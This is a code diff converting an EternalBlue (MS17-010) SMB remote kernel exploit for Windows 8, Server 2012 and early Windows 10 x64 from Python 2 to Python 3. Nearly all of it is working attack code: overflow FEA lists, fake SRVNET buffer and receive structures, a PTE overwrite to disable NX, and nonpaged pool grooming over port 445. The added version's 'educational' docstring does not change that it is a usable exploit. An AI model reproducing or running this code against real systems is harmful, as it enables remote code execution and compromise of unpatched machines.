@@ -1,490 +1,472 @@
-#!/usr/bin/python
-from impacket import smb, ntlm
-from struct import pack
-import sys
+#!/usr/bin/env python3
+"""EternalBlue exploit implementation by Shad0w.
+
+The exploit targets Windows 8/2012/10 (build < 14393) x64 hosts. The code is kept
+for historical/educational reasons – use with care.
+"""
+
+from __future__ import annotations
+
+import argparse
 import socket
+import sys
+from struct import pack
+from typing import Iterable, Tuple
 
-'''
-EternalBlue exploit for Windows 8 and 2012 and Win10 by Shad0w
-The exploit might fail and crash a target system, most likely fixed on most Win10 Versions.
-The exploit support only x64 target
-Tested on:
-- Windows 2012 R2 x64
-- Windows 8.1 x64
-- Windows 10 Pro Build 10240 x64
+from impacket import ntlm, smb
 
-'''
+# Feel free to use/update this code.
+USERNAME = ""
+PASSWORD = ""
 
-# Feel free to use this code/ Update it.
-USERNAME=''
-PASSWORD=''
-
-# because the srvnet buffer is changed dramatically from Windows 7, I have to choose NTFEA size to 0x9000
+# Because the SRVNET buffer changed dramatically from Windows 7, the NTFEA size
+# needs to be 0x9000.
 NTFEA_SIZE = 0x9000
 
-ntfea9000 = (pack('<BBH', 0, 0, 0) + '\x00')*0x260  # with these fea, ntfea size is 0x1c80
-ntfea9000 += pack('<BBH', 0, 0, 0x735c) + '\x00'*0x735d  # 0x8fe8 - 0x1c80 - 0xc = 0x735c
-ntfea9000 += pack('<BBH', 0, 0, 0x8147) + '\x00'*0x8148  # overflow to SRVNET_BUFFER_HDR
+TARGET_HAL_HEAP_ADDR = 0xFFFF_FFFF_FFD0_4000  # Location for fake structs/shellcode.
 
-'''
-Reverse from srvnet.sys (Win2012 R2 x64)
-- SrvNetAllocateBufferFromPool() and SrvNetWskTransformedReceiveComplete():
-// size 0x90
-struct SRVNET_BUFFER_HDR {
-	LIST_ENTRY list;
-	USHORT flag; // 2 least significant bit MUST be clear. if 0x1 is set, pmdl pointers are access. if 0x2 is set, go to lookaside.
-	char unknown0[6];
-	char *pNetRawBuffer;  // MUST point to valid address (check if this request is "\xfdSMB")
-	DWORD netRawBufferSize; // offset: 0x20
-	DWORD ioStatusInfo;
-	DWORD thisNonPagedPoolSize;  // will be 0x82e8 for netRawBufferSize 0x8100
-	DWORD pad2;
-	char *thisNonPagedPoolAddr; // 0x30  points to SRVNET_BUFFER
-	PMDL pmdl1; // point at offset 0x90 from this struct
-	DWORD nByteProcessed; // 0x40
-	char unknown4[4];
-	QWORD smbMsgSize; // MUST be modified to size of all recv data
-	PMDL pmdl2; // 0x50:  if want to free corrupted buffer, need to set to valid address
-	QWORD pSrvNetWskStruct;  // want to change to fake struct address
-	DWORD unknown6; // 0x60
-	char unknown7[12];
-	char unknown8[0x20];
-};
-struct SRVNET_BUFFER {
-	char transportHeader[80]; // 0x50
-	char buffer[reqSize+padding];  // 0x8100 (for pool size 0x82f0), 0x10100 (for pool size 0x11000)
-	SRVNET_BUFFER_HDR hdr; //some header size 0x90
-	//MDL mdl1; // target
-};
-If exploit cannot overflow to prepared SRVNET_BUFFER, the target is likely to crash because of big overflow.
-'''
-
-TARGET_HAL_HEAP_ADDR = 0xffffffffffd04000  # for put fake struct and shellcode
- 
-# Note: feaList will be created after knowing shellcode size.
-
-# feaList for disabling NX is possible because we just want to change only MDL.MappedSystemVa
-# PTE of 0xffffffffffd00000 is at 0xfffff6ffffffe800
-# NX bit is at PTE_ADDR+7
-# MappedSystemVa = PTE_ADDR+7 - 0x7f
-SHELLCODE_PAGE_ADDR = (TARGET_HAL_HEAP_ADDR + 0x400) & 0xfffffffffffff000
-PTE_ADDR = 0xfffff6ffffffe800 + 8*((SHELLCODE_PAGE_ADDR-0xffffffffffd00000) >> 12)
-fakeSrvNetBufferX64Nx = '\x00'*16
-fakeSrvNetBufferX64Nx += pack('<HHIQ', 0xfff0, 0, 0, TARGET_HAL_HEAP_ADDR)
-fakeSrvNetBufferX64Nx += '\x00'*16
-fakeSrvNetBufferX64Nx += '\x00'*16
-fakeSrvNetBufferX64Nx += pack('<QQ', 0, 0)
-fakeSrvNetBufferX64Nx += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR)  # _, _, pointer to fake struct
-fakeSrvNetBufferX64Nx += pack('<QQ', 0, 0)
-fakeSrvNetBufferX64Nx += '\x00'*16
-fakeSrvNetBufferX64Nx += '\x00'*16
-fakeSrvNetBufferX64Nx += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
-fakeSrvNetBufferX64Nx += pack('<QQ', 0, PTE_ADDR+7-0x7f)  # MDL.Process, MDL.MappedSystemVa
-
-feaListNx = pack('<I', 0x10000)
-feaListNx += ntfea9000
-feaListNx += pack('<BBH', 0, 0, len(fakeSrvNetBufferX64Nx)-1) + fakeSrvNetBufferX64Nx # -1 because first '\x00' is for name
-# stop copying by invalid flag (can be any value except 0 and 0x80)
-feaListNx += pack('<BBH', 0x12, 0x34, 0x5678)
+# feaList for disabling NX is possible because we just want to change only
+# MDL.MappedSystemVa. PTE of 0xffffffffffd00000 is at 0xfffff6ffffffe800.
+SHELLCODE_PAGE_ADDR = (TARGET_HAL_HEAP_ADDR + 0x400) & 0xFFFF_FFFF_FFFF_F000
+PTE_ADDR = 0xFFFF_F6FF_FFFF_E800 + 8 * ((SHELLCODE_PAGE_ADDR - 0xFFFF_FFFF_FFD0_0000) >> 12)
 
 
-def createFakeSrvNetBuffer(sc_size):
-	# 0x180 is size of fakeSrvNetBufferX64
-	totalRecvSize = 0x80 + 0x180 + sc_size
-	fakeSrvNetBufferX64 = '\x00'*16
-	fakeSrvNetBufferX64 += pack('<HHIQ', 0xfff0, 0, 0, TARGET_HAL_HEAP_ADDR)  # flag, _, _, pNetRawBuffer
-	fakeSrvNetBufferX64 += pack('<QII', 0, 0x82e8, 0)  # _, thisNonPagedPoolSize, _
-	fakeSrvNetBufferX64 += '\x00'*16
-	fakeSrvNetBufferX64 += pack('<QQ', 0, totalRecvSize)  # offset 0x40
-	fakeSrvNetBufferX64 += pack('<QQ', TARGET_HAL_HEAP_ADDR, TARGET_HAL_HEAP_ADDR)  # pmdl2, pointer to fake struct
-	fakeSrvNetBufferX64 += pack('<QQ', 0, 0)
-	fakeSrvNetBufferX64 += '\x00'*16
-	fakeSrvNetBufferX64 += '\x00'*16
-	fakeSrvNetBufferX64 += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
-	fakeSrvNetBufferX64 += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR-0x80)  # MDL.Process, MDL.MappedSystemVa
-	return fakeSrvNetBufferX64
+def _repeat_bytes(value: bytes, count: int) -> bytes:
+    """Return *value* repeated *count* times."""
 
-def createFeaList(sc_size):
-	feaList = pack('<I', 0x10000)
-	feaList += ntfea9000
-	fakeSrvNetBuf = createFakeSrvNetBuffer(sc_size)
-	feaList += pack('<BBH', 0, 0, len(fakeSrvNetBuf)-1) + fakeSrvNetBuf # -1 because first '\x00' is for name
-	# stop copying by invalid flag (can be any value except 0 and 0x80)
-	feaList += pack('<BBH', 0x12, 0x34, 0x5678)
-	return feaList
-
-# fake struct for SrvNetWskTransformedReceiveComplete() and SrvNetCommonReceiveHandler()
-# x64: fake struct is at ffffffff ffd00e00
-#   offset 0x50:  KSPIN_LOCK
-#   offset 0x58:  LIST_ENTRY must be valid address. cannot be NULL.
-#   offset 0x110: array of pointer to function
-#   offset 0x13c: set to 3 (DWORD) for invoking ptr to function
-# some useful offset
-#   offset 0x120: arg1 when invoking ptr to function
-#   offset 0x128: arg2 when invoking ptr to function
-#
-# code path to get code exection after this struct is controlled
-# SrvNetWskTransformedReceiveComplete() -> SrvNetCommonReceiveHandler() -> call fn_ptr
-fake_recv_struct = ('\x00'*16)*5
-fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR+0x58)  # offset 0x50: KSPIN_LOCK, (LIST_ENTRY to itself)
-fake_recv_struct += pack('<QQ', TARGET_HAL_HEAP_ADDR+0x58, 0)  # offset 0x60
-fake_recv_struct += ('\x00'*16)*10
-fake_recv_struct += pack('<QQ', TARGET_HAL_HEAP_ADDR+0x170, 0)  # offset 0x110: fn_ptr array
-fake_recv_struct += pack('<QQ', (0x8150^0xffffffffffffffff)+1, 0)  # set arg1 to -0x8150
-fake_recv_struct += pack('<QII', 0, 0, 3)  # offset 0x130
-fake_recv_struct += ('\x00'*16)*3
-fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR+0x180)  # shellcode address
+    return value * count if count else b""
 
 
-def getNTStatus(self):
-	return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']
-setattr(smb.NewSMBPacket, "getNTStatus", getNTStatus)
+def build_ntfea9000() -> bytes:
+    """Construct the NTFEA buffer used by the exploit."""
 
-def sendEcho(conn, tid, data):
-	pkt = smb.NewSMBPacket()
-	pkt['Tid'] = tid
-
-	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_ECHO)
-	transCommand['Parameters'] = smb.SMBEcho_Parameters()
-	transCommand['Data'] = smb.SMBEcho_Data()
-
-	transCommand['Parameters']['EchoCount'] = 1
-	transCommand['Data']['Data'] = data
-	pkt.addCommand(transCommand)
-
-	conn.sendSMB(pkt)
-	recvPkt = conn.recvSMB()
-	if recvPkt.getNTStatus() == 0:
-		print('got good ECHO response')
-	else:
-		print('got bad ECHO response: 0x{:x}'.format(recvPkt.getNTStatus()))
+    entries = bytearray(_repeat_bytes(pack("<BBH", 0, 0, 0) + b"\x00", 0x260))
+    entries.extend(pack("<BBH", 0, 0, 0x735C))
+    entries.extend(b"\x00" * 0x735D)
+    entries.extend(pack("<BBH", 0, 0, 0x8147))
+    entries.extend(b"\x00" * 0x8148)
+    return bytes(entries)
 
 
-# override SMB.neg_session() to allow forcing ntlm authentication
+NTFEA_9000 = build_ntfea9000()
+
+
+def build_fake_srvnet_buffer_nx() -> bytes:
+    """Build the fake SRVNET buffer used to disable NX."""
+
+    buffer = bytearray(b"\x00" * 16)
+    buffer.extend(pack("<HHIQ", 0xFFF0, 0, 0, TARGET_HAL_HEAP_ADDR))
+    buffer.extend(b"\x00" * 16)
+    buffer.extend(b"\x00" * 16)
+    buffer.extend(pack("<QQ", 0, 0))
+    buffer.extend(pack("<QQ", 0, TARGET_HAL_HEAP_ADDR))
+    buffer.extend(pack("<QQ", 0, 0))
+    buffer.extend(b"\x00" * 16)
+    buffer.extend(b"\x00" * 16)
+    buffer.extend(pack("<QHHI", 0, 0x60, 0x1004, 0))
+    buffer.extend(pack("<QQ", 0, PTE_ADDR + 7 - 0x7F))
+    return bytes(buffer)
+
+
+FAKE_SRVNET_BUFFER_NX = build_fake_srvnet_buffer_nx()
+
+
+def build_fea_list_nx() -> bytes:
+    """Return the FEA list used for NX disabling."""
+
+    fea_list = bytearray(pack("<I", 0x10000))
+    fea_list.extend(NTFEA_9000)
+    fea_list.extend(pack("<BBH", 0, 0, len(FAKE_SRVNET_BUFFER_NX) - 1))
+    fea_list.extend(FAKE_SRVNET_BUFFER_NX)
+    fea_list.extend(pack("<BBH", 0x12, 0x34, 0x5678))
+    return bytes(fea_list)
+
+
+def create_fake_srvnet_buffer(sc_size: int) -> bytes:
+    """Build the fake SRVNET buffer used for shellcode placement."""
+
+    total_recv_size = 0x80 + 0x180 + sc_size
+    buffer = bytearray(b"\x00" * 16)
+    buffer.extend(pack("<HHIQ", 0xFFF0, 0, 0, TARGET_HAL_HEAP_ADDR))
+    buffer.extend(pack("<QII", 0, 0x82E8, 0))
+    buffer.extend(b"\x00" * 16)
+    buffer.extend(pack("<QQ", 0, total_recv_size))
+    buffer.extend(pack("<QQ", TARGET_HAL_HEAP_ADDR, TARGET_HAL_HEAP_ADDR))
+    buffer.extend(pack("<QQ", 0, 0))
+    buffer.extend(b"\x00" * 16)
+    buffer.extend(b"\x00" * 16)
+    buffer.extend(pack("<QHHI", 0, 0x60, 0x1004, 0))
+    buffer.extend(pack("<QQ", 0, TARGET_HAL_HEAP_ADDR - 0x80))
+    return bytes(buffer)
+
+
+def create_fea_list(sc_size: int) -> bytes:
+    """Construct the FEA list that carries the shellcode payload."""
+
+    fake_srvnet_buf = create_fake_srvnet_buffer(sc_size)
+    fea_list = bytearray(pack("<I", 0x10000))
+    fea_list.extend(NTFEA_9000)
+    fea_list.extend(pack("<BBH", 0, 0, len(fake_srvnet_buf) - 1))
+    fea_list.extend(fake_srvnet_buf)
+    fea_list.extend(pack("<BBH", 0x12, 0x34, 0x5678))
+    return bytes(fea_list)
+
+
+def build_fake_recv_struct() -> bytes:
+    """Return the fake receive structure used by the exploit."""
+
+    structure = bytearray(_repeat_bytes(b"\x00" * 16, 5))
+    structure.extend(pack("<QQ", 0, TARGET_HAL_HEAP_ADDR + 0x58))
+    structure.extend(pack("<QQ", TARGET_HAL_HEAP_ADDR + 0x58, 0))
+    structure.extend(_repeat_bytes(b"\x00" * 16, 10))
+    structure.extend(pack("<QQ", TARGET_HAL_HEAP_ADDR + 0x170, 0))
+    structure.extend(pack("<QQ", (0x8150 ^ 0xFFFF_FFFF_FFFF_FFFF) + 1, 0))
+    structure.extend(pack("<QII", 0, 0, 3))
+    structure.extend(_repeat_bytes(b"\x00" * 16, 3))
+    structure.extend(pack("<QQ", 0, TARGET_HAL_HEAP_ADDR + 0x180))
+    return bytes(structure)
+
+
+FAKE_RECV_STRUCT = build_fake_recv_struct()
+
+
+def get_nt_status(self):
+    return (self["ErrorCode"] << 16) | (self["_reserved"] << 8) | self["ErrorClass"]
+
+
+setattr(smb.NewSMBPacket, "getNTStatus", get_nt_status)
+
+
 class MYSMB(smb.SMB):
-	def __init__(self, remote_host, use_ntlmv2=True):
-		self.__use_ntlmv2 = use_ntlmv2
-		smb.SMB.__init__(self, remote_host, remote_host)
+    """Override SMB.neg_session() to force NTLM authentication."""
 
-	def neg_session(self, extended_security = True, negPacket = None):
-		smb.SMB.neg_session(self, extended_security=self.__use_ntlmv2, negPacket=negPacket)
+    def __init__(self, remote_host: str, use_ntlmv2: bool = True):
+        self.__use_ntlmv2 = use_ntlmv2
+        super().__init__(remote_host, remote_host)
 
-def createSessionAllocNonPaged(target, size):
-	conn = MYSMB(target, use_ntlmv2=False)  # with this negotiation, FLAGS2_EXTENDED_SECURITY is not set
-	_, flags2 = conn.get_flags()
-	# if not use unicode, buffer size on target machine is doubled because converting ascii to utf16
-	if size >= 0xffff:
-		flags2 &= ~smb.SMB.FLAGS2_UNICODE
-		reqSize = size // 2
-	else:
-		flags2 |= smb.SMB.FLAGS2_UNICODE
-		reqSize = size
-	conn.set_flags(flags2=flags2)
-	
-	pkt = smb.NewSMBPacket()
-
-	sessionSetup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
-	sessionSetup['Parameters'] = smb.SMBSessionSetupAndX_Extended_Parameters()
-
-	sessionSetup['Parameters']['MaxBufferSize']      = 61440  # can be any value greater than response size
-	sessionSetup['Parameters']['MaxMpxCount']        = 2  # can by any value
-	sessionSetup['Parameters']['VcNumber']           = 2  # any non-zero
-	sessionSetup['Parameters']['SessionKey']         = 0
-	sessionSetup['Parameters']['SecurityBlobLength'] = 0  # this is OEMPasswordLen field in another format. 0 for NULL session
-	sessionSetup['Parameters']['Capabilities']       = smb.SMB.CAP_EXTENDED_SECURITY | smb.SMB.CAP_USE_NT_ERRORS
-
-	sessionSetup['Data'] = pack('<H', reqSize) + '\x00'*20
-	pkt.addCommand(sessionSetup)
-
-	conn.sendSMB(pkt)
-	recvPkt = conn.recvSMB()
-	if recvPkt.getNTStatus() == 0:
-		print('SMB1 session setup allocate nonpaged pool success')
-		return conn
-	
-	if USERNAME:
-		# Try login with valid user because anonymous user might get access denied on Windows Server 2012.
-		# Note: If target allows only NTLMv2 authentication, the login will always fail.
-		# support only ascii because I am lazy to implement Unicode (need pad for alignment and converting username to utf-16)
-		flags2 &= ~smb.SMB.FLAGS2_UNICODE
-		reqSize = size // 2
-		conn.set_flags(flags2=flags2)
-		
-		# new SMB packet to reset flags
-		pkt = smb.NewSMBPacket()
-		pwd_unicode = conn.get_ntlmv1_response(ntlm.compute_nthash(PASSWORD))
-		# UnicodePasswordLen field is in Reserved for extended security format.
-		sessionSetup['Parameters']['Reserved'] = len(pwd_unicode)
-		sessionSetup['Data'] = pack('<H', reqSize+len(pwd_unicode)+len(USERNAME)) + pwd_unicode + USERNAME + '\x00'*16
-		pkt.addCommand(sessionSetup)
-		
-		conn.sendSMB(pkt)
-		recvPkt = conn.recvSMB()
-		if recvPkt.getNTStatus() == 0:
-			print('SMB1 session setup allocate nonpaged pool success')
-			return conn
-
-	# lazy to check error code, just print fail message
-	print('SMB1 session setup allocate nonpaged pool failed')
-	sys.exit(1)
+    def neg_session(self, extended_security: bool = True, negPacket=None):  # type: ignore[override]
+        super().neg_session(extended_security=self.__use_ntlmv2, negPacket=negPacket)
 
 
-# Note: impacket-0.9.15 struct has no ParameterDisplacement
-############# SMB_COM_TRANSACTION2_SECONDARY (0x33)
+def create_session_alloc_non_paged(target: str, size: int) -> MYSMB:
+    conn = MYSMB(target, use_ntlmv2=False)
+    _, flags2 = conn.get_flags()
+    if size >= 0xFFFF:
+        flags2 &= ~smb.SMB.FLAGS2_UNICODE
+        req_size = size // 2
+    else:
+        flags2 |= smb.SMB.FLAGS2_UNICODE
+        req_size = size
+    conn.set_flags(flags2=flags2)
+
+    pkt = smb.NewSMBPacket()
+    session_setup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
+    session_setup["Parameters"] = smb.SMBSessionSetupAndX_Extended_Parameters()
+
+    params = session_setup["Parameters"]
+    params["MaxBufferSize"] = 61440
+    params["MaxMpxCount"] = 2
+    params["VcNumber"] = 2
+    params["SessionKey"] = 0
+    params["SecurityBlobLength"] = 0
+    params["Capabilities"] = smb.SMB.CAP_EXTENDED_SECURITY | smb.SMB.CAP_USE_NT_ERRORS
+
+    session_setup["Data"] = pack("<H", req_size) + b"\x00" * 20
+    pkt.addCommand(session_setup)
+
+    conn.sendSMB(pkt)
+    recv_pkt = conn.recvSMB()
+    if recv_pkt.getNTStatus() == 0:
+        print("SMB1 session setup allocate nonpaged pool success")
+        return conn
+
+    if USERNAME:
+        flags2 &= ~smb.SMB.FLAGS2_UNICODE
+        req_size = size // 2
+        conn.set_flags(flags2=flags2)
+
+        pkt = smb.NewSMBPacket()
+        session_setup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
+        session_setup["Parameters"] = smb.SMBSessionSetupAndX_Extended_Parameters()
+        params = session_setup["Parameters"]
+        params["MaxBufferSize"] = 61440
+        params["MaxMpxCount"] = 2
+        params["VcNumber"] = 2
+        params["SessionKey"] = 0
+        params["SecurityBlobLength"] = 0
+        params["Capabilities"] = smb.SMB.CAP_EXTENDED_SECURITY | smb.SMB.CAP_USE_NT_ERRORS
+
+        pwd_unicode = conn.get_ntlmv1_response(ntlm.compute_nthash(PASSWORD))
+        params["Reserved"] = len(pwd_unicode)
+        user_bytes = USERNAME.encode("ascii")
+        session_setup["Data"] = pack("<H", req_size + len(pwd_unicode) + len(user_bytes))
+        session_setup["Data"] += pwd_unicode + user_bytes + b"\x00" * 16
+        pkt.addCommand(session_setup)
+
+        conn.sendSMB(pkt)
+        recv_pkt = conn.recvSMB()
+        if recv_pkt.getNTStatus() == 0:
+            print("SMB1 session setup allocate nonpaged pool success")
+            return conn
+
+    print("SMB1 session setup allocate nonpaged pool failed")
+    sys.exit(1)
+
+
 class SMBTransaction2Secondary_Parameters_Fixed(smb.SMBCommand_Parameters):
     structure = (
-        ('TotalParameterCount','<H=0'),
-        ('TotalDataCount','<H'),
-        ('ParameterCount','<H=0'),
-        ('ParameterOffset','<H=0'),
-        ('ParameterDisplacement','<H=0'),
-        ('DataCount','<H'),
-        ('DataOffset','<H'),
-        ('DataDisplacement','<H=0'),
-        ('FID','<H=0'),
+        ("TotalParameterCount", "<H=0"),
+        ("TotalDataCount", "<H"),
+        ("ParameterCount", "<H=0"),
+        ("ParameterOffset", "<H=0"),
+        ("ParameterDisplacement", "<H=0"),
+        ("DataCount", "<H"),
+        ("DataOffset", "<H"),
+        ("DataDisplacement", "<H=0"),
+        ("FID", "<H=0"),
     )
 
-def send_trans2_second(conn, tid, data, displacement):
-	pkt = smb.NewSMBPacket()
-	pkt['Tid'] = tid
 
-	# assume no params
+def send_trans2_second(conn: smb.SMB, tid: int, data: bytes, displacement: int) -> None:
+    pkt = smb.NewSMBPacket()
+    pkt["Tid"] = tid
 
-	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
-	transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
-	transCommand['Data'] = smb.SMBTransaction2Secondary_Data()
+    trans_command = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
+    trans_command["Parameters"] = SMBTransaction2Secondary_Parameters_Fixed()
+    trans_command["Data"] = smb.SMBTransaction2Secondary_Data()
 
-	transCommand['Parameters']['TotalParameterCount'] = 0
-	transCommand['Parameters']['TotalDataCount'] = len(data)
+    params = trans_command["Parameters"]
+    params["TotalParameterCount"] = 0
+    params["TotalDataCount"] = len(data)
 
-	fixedOffset = 32+3+18
-	transCommand['Data']['Pad1'] = ''
+    fixed_offset = 32 + 3 + 18
+    trans_command["Data"]["Pad1"] = b""
 
-	transCommand['Parameters']['ParameterCount'] = 0
-	transCommand['Parameters']['ParameterOffset'] = 0
+    params["ParameterCount"] = 0
+    params["ParameterOffset"] = 0
 
-	if len(data) > 0:
-		pad2Len = (4 - fixedOffset % 4) % 4
-		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
-	else:
-		transCommand['Data']['Pad2'] = ''
-		pad2Len = 0
+    if data:
+        pad2_len = (4 - fixed_offset % 4) % 4
+        trans_command["Data"]["Pad2"] = b"\xFF" * pad2_len
+    else:
+        trans_command["Data"]["Pad2"] = b""
+        pad2_len = 0
 
-	transCommand['Parameters']['DataCount'] = len(data)
-	transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
-	transCommand['Parameters']['DataDisplacement'] = displacement
+    params["DataCount"] = len(data)
+    params["DataOffset"] = fixed_offset + pad2_len
+    params["DataDisplacement"] = displacement
 
-	transCommand['Data']['Trans_Parameters'] = ''
-	transCommand['Data']['Trans_Data'] = data
-	pkt.addCommand(transCommand)
+    trans_command["Data"]["Trans_Parameters"] = b""
+    trans_command["Data"]["Trans_Data"] = data
+    pkt.addCommand(trans_command)
 
-	conn.sendSMB(pkt)
-
-
-def send_big_trans2(conn, tid, setup, data, param, firstDataFragmentSize, sendLastChunk=True):
-	pkt = smb.NewSMBPacket()
-	pkt['Tid'] = tid
-
-	command = pack('<H', setup)
-
-	# Use SMB_COM_NT_TRANSACT because we need to send data >65535 bytes to trigger the bug.
-	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
-	transCommand['Parameters'] = smb.SMBNTTransaction_Parameters()
-	transCommand['Parameters']['MaxSetupCount'] = 1
-	transCommand['Parameters']['MaxParameterCount'] = len(param)
-	transCommand['Parameters']['MaxDataCount'] = 0
-	transCommand['Data'] = smb.SMBTransaction2_Data()
-
-	transCommand['Parameters']['Setup'] = command
-	transCommand['Parameters']['TotalParameterCount'] = len(param)
-	transCommand['Parameters']['TotalDataCount'] = len(data)
-
-	fixedOffset = 32+3+38 + len(command)
-	if len(param) > 0:
-		padLen = (4 - fixedOffset % 4 ) % 4
-		padBytes = '\xFF' * padLen
-		transCommand['Data']['Pad1'] = padBytes
-	else:
-		transCommand['Data']['Pad1'] = ''
-		padLen = 0
-
-	transCommand['Parameters']['ParameterCount'] = len(param)
-	transCommand['Parameters']['ParameterOffset'] = fixedOffset + padLen
-
-	if len(data) > 0:
-		pad2Len = (4 - (fixedOffset + padLen + len(param)) % 4) % 4
-		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
-	else:
-		transCommand['Data']['Pad2'] = ''
-		pad2Len = 0
-
-	transCommand['Parameters']['DataCount'] = firstDataFragmentSize
-	transCommand['Parameters']['DataOffset'] = transCommand['Parameters']['ParameterOffset'] + len(param) + pad2Len
-
-	transCommand['Data']['Trans_Parameters'] = param
-	transCommand['Data']['Trans_Data'] = data[:firstDataFragmentSize]
-	pkt.addCommand(transCommand)
-
-	conn.sendSMB(pkt)
-	recvPkt = conn.recvSMB() # must be success
-	if recvPkt.getNTStatus() == 0:
-		print('got good NT Trans response')
-	else:
-		print('got bad NT Trans response: 0x{:x}'.format(recvPkt.getNTStatus()))
-		sys.exit(1)
-	
-	# Then, use SMB_COM_TRANSACTION2_SECONDARY for send more data
-	i = firstDataFragmentSize
-	while i < len(data):
-		sendSize = min(4096, len(data) - i)
-		if len(data) - i <= 4096:
-			if not sendLastChunk:
-				break
-		send_trans2_second(conn, tid, data[i:i+sendSize], i)
-		i += sendSize
-	
-	if sendLastChunk:
-		conn.recvSMB()
-	return i
-
-	
-# connect to target and send a large nbss size with data 0x80 bytes
-# this method is for allocating big nonpaged pool on target
-def createConnectionWithBigSMBFirst80(target, for_nx=False):
-	sk = socket.create_connection((target, 445))
-	pkt = '\x00' + '\x00' + pack('>H', 0x8100)
-	# There is no need to be SMB2 because we want the target free the corrupted buffer.
-	# Also this is invalid SMB2 message.
-	# I believe NSA exploit use SMB2 for hiding alert from IDS
-	#pkt += '\xfeSMB' # smb2
-	# it can be anything even it is invalid
-	pkt += 'BAAD' # can be any
-	if for_nx:
-		# MUST set no delay because 1 byte MUST be sent immediately
-		sk.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-		pkt += '\x00'*0x7b  # another byte will be sent later to disabling NX
-	else:
-		pkt += '\x00'*0x7c
-	sk.send(pkt)
-	return sk
+    conn.sendSMB(pkt)
 
 
-def exploit(target, shellcode, numGroomConn):
-	# force using smb.SMB for SMB1
-	conn = smb.SMB(target, target)
-	conn.login(USERNAME, PASSWORD)
-	server_os = conn.get_server_os()
-	print('Target OS: '+server_os)
-	if server_os.startswith("Windows 10 "):
-		build = int(server_os.split()[-1])
-		if build >= 14393:  # version 1607
-			print('This exploit does not support this target')
-			sys.exit()
-	elif not (server_os.startswith("Windows 8") or server_os.startswith("Windows Server 2012 ")):
-		print('This exploit does not support this target')
-		sys.exit()
+def send_big_trans2(
+    conn: smb.SMB,
+    tid: int,
+    setup: int,
+    data: bytes,
+    param: bytes,
+    first_data_fragment_size: int,
+    send_last_chunk: bool = True,
+) -> int:
+    pkt = smb.NewSMBPacket()
+    pkt["Tid"] = tid
 
-	tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
+    command = pack("<H", setup)
 
-	# The minimum requirement to trigger bug in SrvOs2FeaListSizeToNt() is SrvSmbOpen2() which is TRANS2_OPEN2 subcommand.
-	# Send TRANS2_OPEN2 (0) with special feaList to a target except last fragment
-	progress = send_big_trans2(conn, tid, 0, feaList, '\x00'*30, len(feaList)%4096, False)
+    trans_command = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
+    trans_command["Parameters"] = smb.SMBNTTransaction_Parameters()
+    trans_command["Parameters"]["MaxSetupCount"] = 1
+    trans_command["Parameters"]["MaxParameterCount"] = len(param)
+    trans_command["Parameters"]["MaxDataCount"] = 0
+    trans_command["Data"] = smb.SMBTransaction2_Data()
 
-	# Another TRANS2_OPEN2 (0) with special feaList for disabling NX
-	nxconn = smb.SMB(target, target)
-	nxconn.login(USERNAME, PASSWORD)
-	nxtid = nxconn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')
-	nxprogress = send_big_trans2(nxconn, nxtid, 0, feaListNx, '\x00'*30, len(feaList)%4096, False)
+    params = trans_command["Parameters"]
+    params["Setup"] = command
+    params["TotalParameterCount"] = len(param)
+    params["TotalDataCount"] = len(data)
 
-	# create some big buffer at server
-	# this buffer MUST NOT be big enough for overflown buffer
-	allocConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x2010)
-	
-	# groom the nonpaged pool
-	# when many big nonpaged pool are allocated, allocate another big nonpaged pool should be next to the last one
-	srvnetConn = []
-	for i in range(numGroomConn):
-		sk = createConnectionWithBigSMBFirst80(target, for_nx=True)
-		srvnetConn.append(sk)
+    fixed_offset = 32 + 3 + 38 + len(command)
+    if param:
+        pad_len = (4 - fixed_offset % 4) % 4
+        pad_bytes = b"\xFF" * pad_len
+        trans_command["Data"]["Pad1"] = pad_bytes
+    else:
+        trans_command["Data"]["Pad1"] = b""
+        pad_len = 0
 
-	# create buffer size NTFEA_SIZE at server
-	# this buffer will be replaced by overflown buffer
-	holeConn = createSessionAllocNonPaged(target, NTFEA_SIZE-0x10)
-	# disconnect allocConn to free buffer
-	# expect small nonpaged pool allocation is not allocated next to holeConn because of this free buffer
-	allocConn.get_socket().close()
+    params["ParameterCount"] = len(param)
+    params["ParameterOffset"] = fixed_offset + pad_len
 
-	# hope one of srvnetConn is next to holeConn
-	for i in range(5):
-		sk = createConnectionWithBigSMBFirst80(target, for_nx=True)
-		srvnetConn.append(sk)
-	
-	# remove holeConn to create hole for fea buffer
-	holeConn.get_socket().close()
-	
-	# send last fragment to create buffer in hole and OOB write one of srvnetConn struct header
-	# first trigger, overwrite srvnet buffer struct for disabling NX
-	send_trans2_second(nxconn, nxtid, feaListNx[nxprogress:], nxprogress)
-	recvPkt = nxconn.recvSMB()
-	retStatus = recvPkt.getNTStatus()
-	if retStatus == 0xc000000d:
-		print('good response status for nx: INVALID_PARAMETER')
-	else:
-		print('bad response status for nx: 0x{:08x}'.format(retStatus))
-		
-	# one of srvnetConn struct header should be modified
-	# send '\x00' to disable nx
-	for sk in srvnetConn:
-		sk.send('\x00')
-	
